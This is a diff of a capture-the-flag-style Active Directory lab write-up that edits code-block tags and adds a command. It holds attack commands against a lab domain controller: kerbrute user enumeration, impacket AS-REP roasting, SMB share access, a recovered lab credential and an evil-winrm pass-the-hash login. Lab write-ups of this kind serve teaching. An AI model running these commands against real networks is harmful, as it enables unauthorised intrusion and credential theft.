@@ -2,7 +2,7 @@
 
 ### Enumeration
 
-```
+```bash
 enum4linux 10.10.176.12
 ```
 
@@ -10,7 +10,7 @@ enum4linux 10.10.176.12
 
 kerbrute
 
-```bash
+```powershell
  ./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.176.12  userlist.txt 
 ```
 
@@ -18,7 +18,7 @@ kerbrute
 
 impacket-GetNPUsers
 
-```
+```bash
 impacket-GetNPUsers spookysec.local/svc-admin -dc-ip 10.10.176.12
 ```
 
@@ -40,7 +40,7 @@ smbclient -L //10.10.176.12  -U "svc-admin"
 
 <figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
-```
+```bash
 smb://ip/backup
 ```
 
@@ -56,6 +56,8 @@ backup@spookysec.local:backup2517860
 
 
 
-
+```bash
+evil-winrm -u <user> -H "hash" -i ip
+```
 
 <figure><img src="../../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
